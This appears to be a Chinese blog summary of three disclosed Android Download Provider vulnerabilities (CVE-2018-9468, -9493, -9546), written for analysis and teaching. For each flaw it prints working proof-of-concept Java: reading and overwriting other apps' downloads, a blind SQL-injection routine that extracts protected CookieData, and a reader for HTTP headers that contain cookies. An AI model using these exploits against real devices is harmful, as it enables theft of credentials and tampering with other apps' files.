[原文](https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
IOActive的安全研究员Daniel Kachakil发现了Android Download Provider相关的几个漏洞（CVE-2018-9468, CVE-2018-9493, CVE-2018-9546）,漏洞原理看似简单却十分有趣，这里总结一下。

原文链接：https://ioactive.com/multiple-vulnerabilities-in-androids-download-provider-cve-2018-9468-cve-2018-9493-cve-2018-9546/

Download Provider
首先了解下Download Provider。Android系统的ContentProvider类似于应用数据库，用于共享自己的数据被其他的应用程序访问。Android提供了一套处理其他App下载请求的机制，例如浏览器的下载、邮件附件的下载、OTA升级包下载等。其中Download Manager用来处理下载请求，DownloadManager下载过程中，会将下载的数据和下载的状态插入ContentProvider中，完成下载后使用ContentProvider来提供下载内容给请求方APP。

使用DownloadManager下载文件的示例代码如下：

//创建下载请求
DownloadManager.Request req = new DownloadManager.Request(Uri.parse("http://www.qq.com"));
//设置下载路径
File saveFile = new File(Environment.getExternalStorageDirectory(), "demo.apk");
req.setDestinationUri(Uri.fromFile(saveFile));

	DownloadManager manager = (DownloadManager) getApplicationContext().getSystemService(Context.DOWNLOAD_SERVICE);

// 将下载请求加入下载队列, 返回一个下载ID
long downloadId = manager.enqueue(req);
关于Download Provider我们需要了解以下几点：

下载完成后，APP访问下载进度、下载状态、下载文件数据等都需要通过download_id来访问，Download Provider提供了三种方式 参考：
content://downloads/public_downloads/(download_id)
公开下载的文件，不需要任何权限
content://downloads/all_downloads/(download_id)
访问所有的下载文件，需要ACCESS_ALL_DOWNLOADS权限（Signature级别的权限）
content://downloads/my_downloads/(download_id)
访问应用自己下载的文件
Download Provider由系统应用com.android.providers.downloads实现，因此作为一个应用，下载保存的位置只可能为public sdcard、private sdcard以及/data/data/com.android.providers.downloads 目录内，如不指定路径，默认下载位置为/data/data/com.android.providers.downloads/cache/
Download Provider实现了一套访问控制机制，应用只能访问自己下载的文件，无权限访问其他应用下载的文件，因此遍历download_id是不可行的。（当然保存在sdcard的文件除外，因为只要有sdcard权限就可以读文件了）
我们知道ContentProvider如果配置不当，可能导致信息泄露、目录穿越等问题，同样如果Download Provider的实现中配置不当有可能带来一些安全问题，下面依次展开这三个漏洞。

CVE-2018-9468: Download Provider权限绕过
正常情况下，APP只能访问自己下载的文件，然而由于content://downloads/public_downloads/(download_id)未做好权限控制，导致可以通过遍历download_id访问所有其他app的下载文件，包括文件下载时的title, description, size, full URL等等。

漏洞修复前后的对比https://android.googlesource.com/platform/packages/providers/DownloadProvider/+/544294737dfc3b585465302f1f784a311659a37c%5E%21/#F0

从补丁来看，Android是删掉了public_downloads这个ContentProvider

upload successful

PoC代码如下：

//1493 其他app下载的
//1492 自己app下载的
ContentResolver res = getContentResolver();
Uri uri = Uri.parse("content://downloads/my_downloads/1493");
Cursor cur = res.query(uri,null,null,null,null,null);
cur.moveToFirst();
String rowdata = cur.getString(cur.getColumnIndex("_data"));
String rowUri = cur.getString(cur.getColumnIndex("uri"));
String rowTitle = cur.getString(cur.getColumnIndex("title"));
String rowdescription = cur.getString(cur.getColumnIndex("description"));
Log.d("m4bln",rowTitle);
Log.d("m4bln",rowUri);
Log.d("m4bln",rowdescription);
除了读取其他app下载的文件外，还可以利用openFile()进行修改。Content Provider的openFile是通过query()对文件定位的,因此该漏洞也会影响openFile()。

upload successful

通过openFile（）我们甚至可以写文件:

ContentResolver res = getContentResolver();
Uri uri = Uri.parse("content://downloads/my_downloads/1493");
Cursor cur = res.query(uri, null, null, null, null);
try {
if (cur != null && cur.getCount() > 0) {
cur.moveToFirst();
String rowData = cur.getString(cur.getColumnIndex("_data"));

        if (rowData != null && !rowData.isEmpty()) {
            try {
                ParcelFileDescriptor fd = res.openFileDescriptor(uri, "rwt");
                FileWriter fw = new FileWriter(fd.getFileDescriptor());
                DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
                fw.write(dateFormat.format(new Date()));
                fw.write("\n(Any arbitrary contents can be placed here...)");

                log(LOG_SEPARATOR + "Overwritten file: " + rowData);
                fw.flush();

                // Closing the file descriptor will crash the Android Media process
                if (closeFile)
                    fd.close();
                else
                    mFileDescriptors.add(fd);
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else
            log(LOG_SEPARATOR + "Cannot overwrite file. The path is empty.");
    } else
        log(LOG_SEPARATOR + "Cannot overwrite file. The download ID " + id + " does not exist.");
} finally {
if (cur != null)
cur.close();
}
这样，利用CVE-2018-9468就可以在下载完成的瞬间替换成攻击者的文件，进行中间人攻击了。作者利用这个漏洞完成了对GooglePlay进行Dos攻击、对gmail的附件进行hijack等攻击。

CVE-2018-9493: Download Provider SQL注入
Download Provider中的以下columns是不允许被外部访问的，例如CookieData，但是利用SQL注入漏洞可以绕过这个限制。

projection参数存在注入漏洞，结合二分法可以爆出某些columns字段的内容。

漏洞修复前后的diff如下：

upload successful

漏洞利用代码如下：

private void dump(boolean dumpProtectedColumns) {
ContentResolver res = getContentResolver();
Uri uri = Uri.parse(MY_DOWNLOADS_URI);
Cursor cur;

        try {
            cur = res.query(uri, null, "1=1) or (1=1", null, null);
        } catch (IllegalArgumentException e) {
            Log.e(TAG, "Error", e);
            log("ERROR: The device does not appear to be vulnerable");
            return;
        }

        try {
            if (cur != null && cur.getCount() > 0) {
                // Iterate all results and display some fields for each row from the downloads database
                while (cur.moveToNext()) {
                    int rowId = cur.getInt(cur.getColumnIndex("_id"));
                    String rowData = cur.getString(cur.getColumnIndex("_data"));
                    String rowUri = cur.getString(cur.getColumnIndex("uri"));
                    String rowTitle = cur.getString(cur.getColumnIndex("title"));
                    String rowDescription = cur.getString(cur.getColumnIndex("description"));

                    StringBuilder sb = new StringBuilder(LOG_SEPARATOR);
                    sb.append("DOWNLOAD ID ").append(rowId);
                    sb.append("\nData: ").append(rowData);
                    sb.append("\nUri: ").append(rowUri);
                    sb.append("\nTitle: ").append(rowTitle);
                    sb.append("\nDescription: ").append(rowDescription);

                    if (dumpProtectedColumns) {
                        int uid = binarySearch(rowId, "uid");
                        sb.append("\nUID: ").append(uid);

                        dumpColumn(rowId, "CookieData", sb);
                        dumpColumn(rowId, "ETag", sb);
                    }

                    log(sb.toString());
                }
                log("\n\nDUMP FINISHED");
            }
        } finally {
            if (cur != null)
                cur.close();
        }
    }

    private void dumpColumn(int rowId, String columnName, StringBuilder sb) {
        if (isTrueCondition(rowId, "length(" + columnName + ") > 0")) {
            int len = binarySearch(rowId, "length(" + columnName + ")");

            sb.append("\n" + columnName + ": ");
            for (int i = 1; i <= len; i++) {
                int c = binarySearch(rowId, "unicode(substr(" + columnName + "," + i + ",1))");
                String newChar = Character.toString((char) c);
                sb.append(newChar);
            }
        }
    }

    private int binarySearch(int id, String sqlExpression) {
        int min = 0;
        int max = 20000;
        int mid = 0;

        while (min + 1 < max) {
            mid = (int) Math.floor((double) (max + min) / 2);

            if (isTrueCondition(id, sqlExpression + ">" + mid))
                min = mid;
            else
                max = mid;
        }

        if ((mid == max) && isTrueCondition(id, sqlExpression + "=" + mid))
            return mid;
        else if (isTrueCondition(id, sqlExpression + "=" + (mid + 1))) // Extra check
            return mid + 1;

        return -1;
    }

    private boolean isTrueCondition(int rowId, String sqlCondition) {
        ContentResolver res = getContentResolver();
        Uri uri = Uri.parse(MY_DOWNLOADS_URI);

        Cursor cur = res.query(uri, new String[]{"_id"}, "_id=" + rowId + ") and (" +
                sqlCondition + ") or (1=1", null, null);

        try {
            return (cur != null && cur.getCount() > 0);
        } finally {
            if (cur != null)
                cur.close();
        }
    }
CVE-2018-9546: Download Provider文件头信息泄露
Download Provider运行app获取下载的http请求头，但理论上APP只能访问自己下载的文件的http请求头，但Download Provider没有做好权限配置，导致heads可以被任意读取。header中会保存一些敏感数据，例如cookie等。

读取header的URI为：content://download/mydownloads/download_id/headers

PoC代码：

Uri uri = Uri.parse("content://download/mydownloads/1493/headers");
Cursor cur = res.query(uri, null, null, null, null);

try {
if (cur != null && cur.getCount() > 0) {
StringBuilder sb = new StringBuilder(LOG_SEPARATOR);
sb.append("HEADERS FOR DOWNLOAD ID ").append(id).append("\n");
while (cur.moveToNext()) {
String rowHeader = cur.getString(cur.getColumnIndex("header"));
String rowValue = cur.getString(cur.getColumnIndex("value"));
sb.append(rowHeader).append(": ").append(rowValue).append("\n\n");
}
log(sb.toString());
}
} finally {
if (cur != null)
cur.close();